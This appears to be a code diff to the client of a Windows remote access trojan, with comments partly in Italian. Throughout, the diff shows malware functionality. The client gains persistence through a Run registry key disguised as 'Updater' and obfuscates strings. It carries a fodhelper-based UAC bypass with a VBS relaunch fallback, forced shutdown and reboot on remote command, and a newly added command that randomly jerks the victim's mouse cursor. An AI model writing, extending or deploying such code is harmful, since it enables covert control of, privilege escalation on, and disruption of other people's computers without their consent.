@@ -1,5 +1,7 @@
 #pragma once
 
+atomic<bool> VibeMouseController = false;
+
 bool IsInstalled()
 {
 	RegUtils ru;
@@ -21,7 +23,7 @@ short InstallClient()
 	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;
 
 	if (PathToCopy.find("<User>") != string::npos)
-		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());
+		PathToCopy = PlaceHolder(PathToCopy, "<User>", su.GetCurrentUser());
 
 	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");
 
@@ -29,7 +31,7 @@ short InstallClient()
 		if (!ru.RegWrite(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
 			return 2;
 
-	if (du.GetFullModuleFilePath() != PathToCopy)
+	if (ToLowerCase(du.GetFullModuleFilePath()) != ToLowerCase(PathToCopy))
 	{
 		if (DEBUG)
 			cout << PathToCopy << " <- " << du.GetFullModuleFilePath() << endl;
@@ -79,6 +81,24 @@ json DirFileTOjson(VectDirFile DirFiles)
 	}
 
 	return j;
+}
+
+void VibeMouseAsync()
+{
+	MouseUtils mu;
+	SystemUtils su;
+
+	while (VibeMouseController)
+	{
+		POINT p = mu.GetMousePos();
+
+		p.x += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);
+		p.y += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);
+
+		mu.SetMousePos(p);
+
+		Sleep(1);
+	}
 }
 
 // COMANDI
@@ -649,7 +669,7 @@ bool BypassUAC(SOCKET Sock)
 	RegUtils ru;
 	SystemUtils su;
 
-	string EmergencyVBS = "WScript.Sleep 5000\n";
+	string EmergencyVBS = "WScript.Sleep 15000\n";
 	EmergencyVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
 	EmergencyVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
 	EmergencyVBS += "WshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\n";
@@ -672,7 +692,7 @@ bool BypassUAC(SOCKET Sock)
 	if (Success)
 		su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
 	
-	Sleep(3000);
+	Sleep(6000);
 	
 	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
 	ru.RegDelKey(AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
@@ -687,6 +707,25 @@ bool BypassUAC(SOCKET Sock)
 	}
 	
 	TcpIP::SendString(Sock, "NO");
+	return false;
+}
+
+bool VibeMouse(SOCKET Sock)
+{
+	if (VibeMouseController)
+	{
+		VibeMouseController = false;
+		return TcpIP::SendString(Sock, "b");
+	}
+	else
+	{
+		VibeMouseController = true;
+		thread tVMA(VibeMouseAsync);
+		tVMA.detach();
+
+		return TcpIP::SendString(Sock, "a");
+	}
+
 	return false;
 }
 
@@ -719,13 +758,11 @@ short Sessione(TcpIP Client)
 		}
 		else if (cmd == "shutdown")
 		{
-			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -t 0"));
-			return 1;
+			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -f -t 0"));
 		}
 		else if (cmd == "reboot")
 		{
-			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -t 0"));
-			return 1;
+			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -f -t 0"));
 		}
 		else if (cmd == "updateclient")
 		{
@@ -754,6 +791,10 @@ short Sessione(TcpIP Client)
 		{
 			if (BypassUAC(Client.Sock))
 				return 1;
+		}
+		else if (cmd == "vibemouse")
+		{
+			i = VibeMouse(Client.Sock);
 		}
 	}
 
